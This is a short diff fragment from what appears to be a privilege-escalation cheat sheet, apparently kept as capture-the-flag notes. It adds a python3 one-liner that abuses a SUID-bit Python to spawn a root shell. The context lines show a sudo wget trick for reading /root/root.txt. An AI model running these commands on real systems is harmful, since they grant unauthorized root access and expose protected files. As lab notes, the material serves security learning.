@@ -126,3 +126,7 @@ sudo wget --input-file /root/root.txt
 Login as another user from terminal:
 
 sudo -u user /bin/bash
+
+If suid bit set on python then run following command to get root:
+
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
